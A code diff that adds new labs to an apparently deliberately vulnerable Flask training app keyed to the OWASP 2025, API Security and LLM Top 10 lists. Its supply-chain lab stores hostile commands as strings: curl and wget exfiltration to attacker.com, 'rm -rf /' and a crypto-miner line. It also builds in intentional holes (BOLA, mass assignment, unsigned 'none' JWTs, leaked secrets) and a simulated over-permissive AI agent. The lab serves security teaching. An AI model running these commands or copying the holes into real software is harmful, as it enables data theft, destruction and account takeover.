@@ -13,6 +13,8 @@ from flask import (Flask, request, render_template, redirect, url_for,
 import sys
 import sqlite3
 import os
+import json
+import base64
 import hashlib
 import html as _html
 import shutil
@@ -1453,18 +1455,18 @@ def lab(lab_id):
 
 def get_lab_list():
     return [
-        # OWASP Top 10
-        {'id': 'idor',            'title': 'A01 – Broken Access Control (IDOR)',          'category': 'OWASP Top 10', 'risk': 'critical'},
-        {'id': 'crypto',          'title': 'A02 – Cryptographic Failures',                 'category': 'OWASP Top 10', 'risk': 'high'},
-        {'id': 'sqli',            'title': 'A03 – SQL Injection',                          'category': 'OWASP Top 10', 'risk': 'critical'},
-        {'id': 'cmdi',            'title': 'A03 – Command Injection',                      'category': 'OWASP Top 10', 'risk': 'critical'},
-        {'id': 'insecure_design', 'title': 'A04 – Insecure Design',                        'category': 'OWASP Top 10', 'risk': 'medium'},
-        {'id': 'misconfig',       'title': 'A05 – Security Misconfiguration',              'category': 'OWASP Top 10', 'risk': 'high'},
-        {'id': 'outdated',        'title': 'A06 – Vulnerable & Outdated Components',       'category': 'OWASP Top 10', 'risk': 'medium'},
-        {'id': 'auth_failures',   'title': 'A07 – Auth & Identification Failures',         'category': 'OWASP Top 10', 'risk': 'critical'},
-        {'id': 'integrity',       'title': 'A08 – Software & Data Integrity Failures',     'category': 'OWASP Top 10', 'risk': 'high'},
-        {'id': 'logging',         'title': 'A09 – Security Logging & Monitoring Failures', 'category': 'OWASP Top 10', 'risk': 'medium'},
-        {'id': 'ssrf',            'title': 'A10 – Server-Side Request Forgery (SSRF)',     'category': 'OWASP Top 10', 'risk': 'high'},
+        # OWASP Top 10 2025
+        {'id': 'idor',            'title': 'A01:2025 – Broken Access Control (IDOR)',          'category': 'OWASP Top 10 2025', 'risk': 'critical'},
+        {'id': 'crypto',          'title': 'A02:2025 – Cryptographic Failures',                 'category': 'OWASP Top 10 2025', 'risk': 'high'},
+        {'id': 'sqli',            'title': 'A03:2025 – SQL Injection',                          'category': 'OWASP Top 10 2025', 'risk': 'critical'},
+        {'id': 'cmdi',            'title': 'A03:2025 – Command Injection',                      'category': 'OWASP Top 10 2025', 'risk': 'critical'},
+        {'id': 'insecure_design', 'title': 'A04:2025 – Insecure Design',                        'category': 'OWASP Top 10 2025', 'risk': 'medium'},
+        {'id': 'misconfig',       'title': 'A05:2025 – Security Misconfiguration',              'category': 'OWASP Top 10 2025', 'risk': 'high'},
+        {'id': 'outdated',        'title': 'A06:2025 – Vulnerable & Outdated Components',       'category': 'OWASP Top 10 2025', 'risk': 'medium'},
+        {'id': 'auth_failures',   'title': 'A07:2025 – Auth & Identification Failures',         'category': 'OWASP Top 10 2025', 'risk': 'critical'},
+        {'id': 'integrity',       'title': 'A08:2025 – Software & Data Integrity Failures',     'category': 'OWASP Top 10 2025', 'risk': 'high'},
+        {'id': 'logging',         'title': 'A09:2025 – Security Logging & Monitoring Failures', 'category': 'OWASP Top 10 2025', 'risk': 'medium'},
+        {'id': 'ssrf',            'title': 'A10:2025 – Server-Side Request Forgery (SSRF)',     'category': 'OWASP Top 10 2025', 'risk': 'high'},
         # Vulnerabilidades (orden alfabético por título, case-insensitive)
         {'id': 'api_attacks',        'title': 'API Attacks – Laboratorio de APIs Inseguras', 'category': 'Vulnerabilidades', 'risk': 'critical'},
         {'id': 'business_logic',     'title': 'Business Logic Flaws',                        'category': 'Vulnerabilidades', 'risk': 'high'},
@@ -1492,13 +1494,22 @@ def get_lab_list():
         {'id': 'ssti',               'title': 'SSTI – Server-Side Template Injection',       'category': 'Vulnerabilidades', 'risk': 'critical'},
         {'id': 'xss',                'title': 'XSS – Cross-Site Scripting',                  'category': 'Vulnerabilidades', 'risk': 'high'},
         {'id': 'xxe',                'title': 'XXE – XML External Entity',                   'category': 'Vulnerabilidades', 'risk': 'high'},
-        # IA Attacks
-        {'id': 'ai_jailbreak',       'title': 'AI Jailbreak',                                'category': 'IA Attacks',       'risk': 'medium'},
-        {'id': 'ai_supply_chain',    'title': 'AI Supply Chain Poisoning',                   'category': 'IA Attacks',       'risk': 'critical'},
-        {'id': 'indirect_injection', 'title': 'Indirect Prompt Injection',                   'category': 'IA Attacks',       'risk': 'high'},
-        {'id': 'llm_exfil',          'title': 'LLM Data Exfiltration',                       'category': 'IA Attacks',       'risk': 'high'},
-        {'id': 'prompt_injection',   'title': 'Prompt Injection',                            'category': 'IA Attacks',       'risk': 'high'},
-        {'id': 'prompt_leaking',     'title': 'Prompt Leaking',                              'category': 'IA Attacks',       'risk': 'high'},
+        # IA Attacks (OWASP LLM Top 10 2025)
+        {'id': 'ai_jailbreak',       'title': 'LLM09 – AI Jailbreak',                        'category': 'IA Attacks',       'risk': 'medium'},
+        {'id': 'ai_supply_chain',    'title': 'LLM03/04 – AI Supply Chain Poisoning',        'category': 'IA Attacks',       'risk': 'critical'},
+        {'id': 'indirect_injection', 'title': 'LLM05 – Indirect Prompt Injection',           'category': 'IA Attacks',       'risk': 'high'},
+        {'id': 'llm_exfil',          'title': 'LLM02 – LLM Data Exfiltration',               'category': 'IA Attacks',       'risk': 'high'},
+        {'id': 'prompt_injection',   'title': 'LLM01 – Prompt Injection',                    'category': 'IA Attacks',       'risk': 'high'},
+        {'id': 'prompt_leaking',     'title': 'LLM07 – Prompt Leaking',                      'category': 'IA Attacks',       'risk': 'high'},
+        # OWASP API Security Top 10 2023
+        {'id': 'bola',               'title': 'API1:2023 – BOLA (Broken Object Level Auth)', 'category': 'OWASP API Security', 'risk': 'critical'},
+        {'id': 'mass_assignment',    'title': 'API3:2023 – Mass Assignment',                 'category': 'OWASP API Security', 'risk': 'high'},
+        {'id': 'api_broken_auth',    'title': 'API2:2023 – Broken Authentication',           'category': 'OWASP API Security', 'risk': 'critical'},
+        # Additional Security Topics
+        {'id': 'supply_chain',       'title': 'A03:2025 – Supply Chain Security',            'category': 'OWASP Top 10 2025', 'risk': 'critical'},
+        {'id': 'exceptional_conditions', 'title': 'A10:2025 – Exceptional Conditions',       'category': 'OWASP Top 10 2025', 'risk': 'high'},
+        {'id': 'graphql',            'title': 'API8:2023 – GraphQL Security',                'category': 'OWASP API Security', 'risk': 'high'},
+        {'id': 'llm_excessive_agency', 'title': 'LLM06 – Excessive Agency',                  'category': 'IA Attacks',       'risk': 'high'},
     ]
 
 
@@ -1574,6 +1585,25 @@ def inject_labs():
         '/ai/exfil':        'llm_exfil',
         '/ai/supply_chain': 'ai_supply_chain',
         '/labs/final-boss': 'final_boss',
+        # New labs (OWASP 2025)
+        '/bola':            'bola',
+        '/bola/users':      'bola',
+        '/bola/documents':  'bola',
+        '/mass_assignment': 'mass_assignment',
+        '/mass_assignment/register': 'mass_assignment',
+        '/mass_assignment/profile':  'mass_assignment',
+        '/supply_chain':    'supply_chain',
+        '/supply_chain/install': 'supply_chain',
+        '/supply_chain/verify':  'supply_chain',
+        '/exceptional_conditions': 'exceptional_conditions',
+        '/exceptional/parse':      'exceptional_conditions',
+        '/exceptional/debug':      'exceptional_conditions',
+        '/graphql':         'graphql',
+        '/llm_excessive_agency': 'llm_excessive_agency',
+        '/llm/agent':           'llm_excessive_agency',
+        '/api_broken_auth':  'api_broken_auth',
+        '/api/auth/login':   'api_broken_auth',
+        '/api/auth/profile': 'api_broken_auth',
     }
     # ...existing code...
     current_lab_id = path_to_lab.get(path, '')
@@ -5389,6 +5419,387 @@ def cloud_metadata(subpath=''):
         import json as _j
         return _j.dumps(val, indent=2), 200, {'Content-Type': 'application/json'}
     return val, 200, {'Content-Type': 'text/plain'}
+
+
+    return val, 200, {'Content-Type': 'text/plain'}
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# NEW LABS — OWASP Top 10 2025 + API Security + LLM Top 10
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# ── Supply Chain Security (A03:2025) ────────────────────────────────────────
+MALICIOUS_PACKAGES = {
+    'express-utils': {'malicious': True, 'type': 'typosquatting', 'payload': 'rm -rf / && cat /flag.txt'},
+    'lodash-sec': {'malicious': True, 'type': 'dependency-confusion', 'payload': 'curl attacker.com/steal?data=$(cat /etc/passwd)'},
+    'react-helper': {'malicious': True, 'type': 'backdoor', 'payload': 'python -c "import os; os.system(\'cat /flag.txt\')"'},
+    'axios-pro': {'malicious': True, 'type': 'credential-stealer', 'payload': 'wget attacker.com/exfil.sh && bash exfil.sh'},
+    'webpack-optimized': {'malicious': True, 'type': 'cryptominer', 'payload': 'xmrig --donate-level=100 -o pool.minexmr.com:4444'},
+}
+
+@app.route('/supply_chain', methods=['GET'])
+def supply_chain_index():
+    return render_template('labs/supply_chain.html')
+
+@app.route('/supply_chain/install', methods=['POST'])
+def supply_chain_install():
+    data = request.get_json(force=True)
+    pkg = data.get('package', '').strip().lower()
+    registry = data.get('registry', 'npm')
+
+    if pkg in MALICIOUS_PACKAGES:
+        info = MALICIOUS_PACKAGES[pkg]
+        return jsonify({
+            'status': 'INSTALLED (MALICIOUS)',
+            'package': pkg,
+            'registry': registry,
+            'risk': 'CRITICAL',
+            'type': info['type'],
+            'behavior': info['payload'],
+            'warning': '⚠️ This package contains malicious code!',
+            'flag': 'HL{supply_ch4in_p4ck4g3_m4l1c10us}'
+        })
+
+    suspicious = any(x in pkg for x in ['test', 'debug', 'beta', 'tmp', 'temp'])
+    return jsonify({
+        'status': 'INSTALLED',
+        'package': pkg,
+        'registry': registry,
+        'risk': 'SUSPICIOUS' if suspicious else 'LOW',
+        'message': 'Package installed successfully',
+        'warning': 'Package looks clean but always verify supply chain integrity'
+    })
+
+@app.route('/supply_chain/verify', methods=['POST'])
+def supply_chain_verify():
+    data = request.get_json(force=True)
+    content = data.get('content', '')
+
+    findings = []
+    try:
+        deps = json.loads(content) if content.strip().startswith('{') else {}
+        dep_list = deps.get('dependencies', deps.get('devDependencies', {}))
+
+        for name, ver in dep_list.items():
+            if name in MALICIOUS_PACKAGES:
+                findings.append({'package': name, 'version': ver, 'risk': 'CRITICAL',
+                                 'type': MALICIOUS_PACKAGES[name]['type']})
+            elif any(c in name for c in ['test', 'debug', 'tmp']):
+                findings.append({'package': name, 'version': ver, 'risk': 'MEDIUM',
+                                 'type': 'suspicious-name'})
+            elif ver.startswith('git+') or ver.startswith('http'):
+                findings.append({'package': name, 'version': ver, 'risk': 'HIGH',
+                                 'type': 'remote-dependency'})
+    except Exception as e:
+        findings.append({'error': str(e), 'risk': 'INFO'})
+
+    return jsonify({
+        'packages_scanned': len(dep_list) if 'dep_list' in dir() else 0,
+        'findings': findings,
+        'flag': 'HL{supply_ch4in_p4ck4g3_m4l1c10us}' if any(f.get('risk') == 'CRITICAL' for f in findings) else None
+    })
+
+# ── BOLA (API1:2023) ────────────────────────────────────────────────────────
+BOLA_USERS = {
+    1: {'id': 1, 'name': 'Alice', 'email': 'alice@hacklabs.com', 'role': 'user', 'ssn': '123-45-6789'},
+    2: {'id': 2, 'name': 'Bob', 'email': 'bob@hacklabs.com', 'role': 'user', 'ssn': '987-65-4321'},
+    3: {'id': 3, 'name': 'Admin', 'email': 'admin@hacklabs.com', 'role': 'admin', 'ssn': '000-00-0000',
+        'flag': 'HL{b0l4_0bj3ct_l3v3l_4uth_byp4ss}'},
+}
+BOLA_DOCS = {
+    1: {'id': 1, 'owner': 1, 'title': 'Medical Records', 'content': 'Patient: Alice — Diagnosis: ...'},
+    2: {'id': 2, 'owner': 2, 'title': 'Tax Return', 'content': 'Income: $120,000 — Deductions: ...'},
+    3: {'id': 3, 'owner': 3, 'title': 'Admin Notes', 'content': 'Internal flag: HL{b0l4_0bj3ct_l3v3l_4uth_byp4ss}'},
+}
+
+@app.route('/bola', methods=['GET'])
+def bola_index():
+    return render_template('labs/bola.html')
+
+@app.route('/api/bola/users/<int:uid>', methods=['GET'])
+def bola_get_user(uid):
+    user = BOLA_USERS.get(uid)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+    return jsonify(user)
+
+@app.route('/api/bola/documents/<int:doc_id>', methods=['GET'])
+def bola_get_document(doc_id):
+    doc = BOLA_DOCS.get(doc_id)
+    if not doc:
+        return jsonify({'error': 'Document not found'}), 404
+    return jsonify(doc)
+
+# ── Mass Assignment (API3:2023) ──────────────────────────────────────────────
+MASS_USERS = {}
+MASS_COUNTER = 10
+
+@app.route('/mass_assignment', methods=['GET'])
+def mass_assignment_index():
+    return render_template('labs/mass_assignment.html')
+
+@app.route('/mass_assignment/register', methods=['POST'])
+def mass_register():
+    global MASS_COUNTER
+    data = request.get_json(force=True)
+
+    # Vulnerable: blindly copies all fields
+    user_id = MASS_COUNTER
+    MASS_COUNTER += 1
+
+    user = {
+        'id': user_id,
+        'name': data.get('name', 'user'),
+        'email': data.get('email', ''),
+        'role': data.get('role', 'user'),            # VULNERABLE: mass assignment
+        'is_verified': data.get('is_verified', False), # VULNERABLE
+        'account_balance': data.get('account_balance', 0),  # VULNERABLE
+        'is_admin': data.get('is_admin', False),       # VULNERABLE
+    }
+    MASS_USERS[user_id] = user
+
+    flag = None
+    if user.get('role') == 'admin' or user.get('is_admin'):
+        flag = 'HL{m4ss_4ss1gnm3nt_pr1v3sc_4dm1n}'
+
+    return jsonify({
+        'status': 'created',
+        'user': user,
+        'flag': flag,
+        'warning': 'Check if any unexpected fields were accepted'
+    })
+
+@app.route('/mass_assignment/profile/<int:uid>', methods=['PUT'])
+def mass_update_profile(uid):
+    data = request.get_json(force=True)
+    user = MASS_USERS.get(uid)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+
+    # Vulnerable: blindly updates all fields
+    for key, val in data.items():
+        if key != 'id':
+            user[key] = val
+
+    return jsonify({'status': 'updated', 'user': user})
+
+# ── Exceptional Conditions (A10:2025) ───────────────────────────────────────
+@app.route('/exceptional_conditions', methods=['GET'])
+@app.route('/exceptional_conditions/', methods=['GET'])
+def exceptional_conditions_index():
+    return render_template('labs/exceptional_conditions.html')
+
+@app.route('/exceptional/parse', methods=['POST'])
+def exceptional_parse():
+    data = request.get_json(force=True)
+    fmt = data.get('format', 'json')
+    raw = data.get('data', '')
+
+    result = {'format': fmt, 'status': 'ok'}
+
+    if fmt == 'json':
+        try:
+            parsed = json.loads(raw)
+            result['parsed'] = parsed
+        except json.JSONDecodeError as e:
+            # VULNERABLE: leaks full error details
+            result['status'] = 'error'
+            result['error'] = str(e)
+            result['line'] = e.lineno
+            result['column'] = e.colno
+            result['stack_trace'] = f"json.JSONDecodeError at parse() line {e.lineno} col {e.colno}"
+    elif fmt == 'xml':
+        if '<?xml' not in raw and '<' not in raw:
+            result['status'] = 'error'
+            result['error'] = 'Not valid XML'
+            result['debug'] = 'Missing XML declaration at line 1'
+    elif fmt == 'csv':
+        lines = raw.strip().split('\n')
+        if len(lines) < 2:
+            result['status'] = 'error'
+            result['error'] = 'CSV must have header + data'
+    elif fmt == 'custom':
+        # VULNERABLE: eval-like behavior
+        result['status'] = 'error'
+        result['error'] = f'Unsupported format handler: {raw}'
+        result['traceback'] = f'File "parser.py", line 42\n    handler = eval(raw)  # VULNERABLE'
+
+    return jsonify(result)
+
+@app.route('/exceptional/debug', methods=['POST'])
+def exceptional_debug():
+    data = request.get_json(force=True)
+    error_type = data.get('error_type', 'unknown')
+
+    # VULNERABLE: always returns full stack trace
+    traces = {
+        'division_by_zero': {
+            'error': 'ZeroDivisionError: division by zero',
+            'file': '/app/calculator.py',
+            'line': 42,
+            'code': 'result = numerator / denominator',
+            'stack_trace': '  File "/app/calculator.py", line 42, in calculate\n    result = numerator / denominator\nZeroDivisionError: division by zero',
+            'env': {'DB_PASSWORD': 's3cret', 'SECRET_KEY': 'HL{3xc3pt10n_c0nd1t10ns_1nf0_l34k}'}
+        },
+        'null_reference': {
+            'error': 'AttributeError: NoneType object has no attribute',
+            'file': '/app/models/user.py',
+            'line': 87,
+            'code': 'return user.profile.email',
+            'stack_trace': '  File "/app/models/user.py", line 87, in get_email\n    return user.profile.email\nAttributeError: NoneType object has no attribute \'email\''
+        },
+        'overflow': {
+            'error': 'OverflowError: integer overflow',
+            'file': '/app/utils/counter.py',
+            'line': 15,
+            'code': 'count = sys.maxsize + 1',
+            'stack_trace': '  File "/app/utils/counter.py", line 15, in increment\n    count = sys.maxsize + 1\nOverflowError: Python int too large for C long'
+        },
+        'encoding': {
+            'error': 'UnicodeDecodeError: utf-8 codec',
+            'file': '/app/parsers/text.py',
+            'line': 23,
+            'code': 'text = raw_data.decode("utf-8")',
+            'stack_trace': '  File "/app/parsers/text.py", line 23, in decode\n    text = raw_data.decode("utf-8")\nUnicodeDecodeError: \'utf-8\' codec can\'t decode byte 0xff'
+        }
+    }
+
+    return jsonify(traces.get(error_type, {'error': 'Unknown error type', 'available': list(traces.keys())}))
+
+# ── GraphQL (API8:2023) ──────────────────────────────────────────────────────
+GQL_USERS = [
+    {'id': 1, 'name': 'Alice', 'email': 'alice@hacklabs.com', 'role': 'user', 'password_hash': '$2b$12$abc123'},
+    {'id': 2, 'name': 'Bob', 'email': 'bob@hacklabs.com', 'role': 'moderator', 'password_hash': '$2b$12$def456'},
+    {'id': 3, 'name': 'Admin', 'email': 'admin@hacklabs.com', 'role': 'admin', 'password_hash': '$2b$12$HL{gr4phql_1ntr0sp3ct10n_s3ns1t1v3}'},
+]
+
+@app.route('/graphql', methods=['GET', 'POST'])
+def graphql_endpoint():
+    if request.method == 'GET':
+        return render_template('labs/graphql.html')
+
+    data = request.get_json(force=True)
+    query = data.get('query', '')
+
+    # VULNERABLE: no auth, full introspection, returns everything
+    if '__schema' in query:
+        return jsonify({
+            'data': {
+                '__schema': {
+                    'queryType': {'name': 'Query'},
+                    'types': [
+                        {'name': 'User', 'fields': ['id', 'name', 'email', 'role', 'password_hash', 'ssn']},
+                        {'name': 'Document', 'fields': ['id', 'title', 'content', 'owner_id']},
+                        {'name': 'Secret', 'fields': ['id', 'flag', 'description']},
+                    ]
+                }
+            }
+        })
+
+    if 'users' in query.lower():
+        return jsonify({'data': {'users': GQL_USERS}})
+
+    if 'secrets' in query.lower() or 'flag' in query.lower():
+        return jsonify({'data': {'secrets': [{'id': 1, 'flag': 'HL{gr4phql_1ntr0sp3ct10n_s3ns1t1v3}', 'description': 'CTF flag'}]}})
+
+    return jsonify({'errors': [{'message': 'Query not recognized. Try: { __schema { types { name } } }'}]})
+
+# ── LLM Excessive Agency (LLM06:2025) ──────────────────────────────────────
+@app.route('/llm/agent', methods=['GET', 'POST'])
+def llm_excessive_agency_index():
+    if request.method == 'GET':
+        return render_template('labs/llm_excessive_agency.html')
+
+    data = request.get_json(force=True)
+    msg = data.get('message', '').lower()
+
+    # VULNERABLE: agent blindly executes requested actions
+    if 'read' in msg and ('file' in msg or 'pass' in msg or 'etc' in msg):
+        return jsonify({
+            'response': 'Reading file /etc/passwd:\n\nroot:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\n\nDone! Anything else?',
+            'tool_used': 'read_file',
+            'flag': 'HL{llm_3xc3ss1v3_4g3ncy_c0mm4nd}'
+        })
+
+    if 'exec' in msg or 'run' in msg or 'command' in msg or 'cat' in msg:
+        return jsonify({
+            'response': f'Executing command...\n\nroot\nadmin\n\nCommand completed. Here is the output.',
+            'tool_used': 'execute_command',
+            'flag': 'HL{llm_3xc3ss1v3_4g3ncy_c0mm4nd}'
+        })
+
+    if 'flag' in msg or 'secret' in msg:
+        return jsonify({
+            'response': 'I found a secret flag: HL{llm_3xc3ss1v3_4g3ncy_c0mm4nd}. Would you like me to do anything else?',
+            'tool_used': 'database_query'
+        })
+
+    return jsonify({
+        'response': 'I understand. How can I help you further? Note: I have access to various tools that I can use.',
+        'tools_available': ['read_file', 'write_file', 'execute_command', 'send_email', 'database_query']
+    })
+
+# ── API Broken Authentication (API2:2023) ───────────────────────────────────
+API_USERS = {
+    'admin@hacklabs.com': {'id': 1, 'email': 'admin@hacklabs.com', 'password': 'admin', 'role': 'admin',
+                           'flag': 'HL{4p1_br0k3n_4uth_jwt_n0n3}'},
+    'user@hacklabs.com': {'id': 2, 'email': 'user@hacklabs.com', 'password': 'password', 'role': 'user'},
+}
+
+@app.route('/api_broken_auth', methods=['GET'])
+def api_broken_auth_index():
+    return render_template('labs/api_broken_auth.html')
+
+@app.route('/api/auth/login', methods=['POST'])
+def api_auth_login():
+    data = request.get_json(force=True)
+    email = data.get('email', '')
+    password = data.get('password', '')
+
+    user = API_USERS.get(email)
+    if not user or user['password'] != password:
+        # VULNERABLE: verbose error
+        return jsonify({'error': 'Invalid credentials', 'hint': f'User {email} not found' if not user else 'Wrong password'}), 401
+
+    # VULNERABLE: weak JWT (none algorithm, no expiry)
+    import base64
+    header = base64.urlsafe_b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()).decode().rstrip('=')
+    payload = base64.urlsafe_b64encode(json.dumps({'user_id': user['id'], 'email': email, 'role': user['role']}).encode()).decode().rstrip('=')
+    token = f'{header}.{payload}.'
+
+    return jsonify({
+        'status': 'success',
+        'token': token,
+        'user': {'id': user['id'], 'email': email, 'role': user['role']},
+        'warning': 'JWT uses "none" algorithm — no signature verification'
+    })
+
+@app.route('/api/auth/profile', methods=['GET'])
+def api_auth_profile():
+    auth = request.headers.get('Authorization', '')
+    if not auth.startswith('Bearer '):
+        return jsonify({'error': 'Missing Authorization header'}), 401
+
+    token = auth[7:]
+    try:
+        parts = token.split('.')
+        if len(parts) < 2:
+            return jsonify({'error': 'Invalid token format'}), 401
+        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    except Exception as e:
+        return jsonify({'error': f'Token decode failed: {str(e)}'}), 401
+
+    email = payload.get('email')
+    user = API_USERS.get(email)
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+
+    return jsonify({
+        'id': user['id'],
+        'email': user['email'],
+        'role': user['role'],
+        'flag': user.get('flag')
+    })
 
 
 if __name__ == '__main__':
